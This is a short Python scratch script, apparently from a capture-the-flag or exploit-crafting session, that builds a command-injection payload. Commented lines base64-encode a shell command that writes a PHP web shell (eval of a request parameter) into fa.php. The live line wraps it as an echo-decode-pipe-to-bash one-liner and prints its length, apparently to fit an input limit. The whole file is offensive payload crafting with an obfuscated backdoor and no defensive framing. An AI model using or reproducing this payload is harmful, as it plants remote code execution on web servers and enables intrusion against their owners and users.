# import base64
# all=base64.b64encode('''echo "<?php eval(\$_REQUEST['a']);" > fa.php'''.encode('utf-8'))
# print(all)
# result='ZWNobyAiPD9waHAgZXZhbChcJF9SRVFVRVNUWydhJ10pOyIgPiBmYS5waHA=|base64 -d|bash -c'
# print(result)
# print(len(result))
# all='''echo "<?php eval(\$_REQUEST['a']);" > fa.php '''
# result=all+'|bash -c'
result="echo 'ZWNobyAiPD9waHAgZXZhbChcJF9SRVFVRVNUWydhJ10pOyIgPiBmYS5waHA='|base64 -d|bash"
print(len(result))